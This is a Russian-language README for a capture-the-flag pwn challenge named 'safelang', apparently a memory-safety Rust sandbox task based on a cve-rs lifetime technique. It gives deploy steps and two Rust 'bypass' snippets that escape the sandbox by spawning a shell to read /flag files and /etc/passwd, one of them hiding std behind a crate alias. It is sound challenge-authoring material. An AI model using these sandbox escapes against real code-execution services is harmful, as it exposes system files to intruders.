# safelang | pwn

## Информация

В мрачной мгле недалекого будущего есть только memory-safety.

## Деплой

```sh
cd deploy
docker compose -p safelang up --build -d
```

## Выдать участинкам

Provide zip archive: [public/safelang.zip](public/safelang.zip).

## Описание

lifetime extension hack с помощью техники из cve-rs.

## Решение

[Подробрное решение](solve/Readme.md)

## Обход 1

```rust
use std::process::{Command, CommandArgs};
fn main() {
    let mut process = Command::new("sh").arg("-c").arg("cat /flag*").spawn().unwrap().wait_with_output();
    print!("{:?}", process);
}
```

## Обход 3


```rust
extern crate std as asdf;

fn main() {
    let x = asdf::process::Command::new("/bin/sh").arg("-c").arg("cat /etc/passwd").output().unwrap().stdout;
    let x = String::from_utf8_lossy(&x);

    print(x);
}
```
